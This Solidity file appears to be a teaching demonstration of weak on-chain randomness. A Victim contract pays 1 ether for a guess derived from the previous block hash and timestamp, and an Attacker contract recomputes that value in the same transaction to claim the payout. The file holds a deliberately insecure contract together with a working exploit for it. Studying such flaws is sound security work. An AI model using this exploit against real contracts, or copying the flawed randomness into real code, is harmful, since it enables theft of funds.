// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

/**
 * @notice
 * the guess can be found copying the timestamp and block.number hash
 */

contract Victim {
    error Victim_FailToSendEth();

    constructor() payable {}

    function guess(uint256 _guess) public {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        if (_guess == answer) {
            (bool success,) = msg.sender.call{value: 1 ether}("");
            if (!success) {
                revert Victim_FailToSendEth();
            }
        }
    }
}

contract Attacker {
    receive() external payable {}

    function attack(Victim victim) public {
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        victim.guess(answer);
    }
}
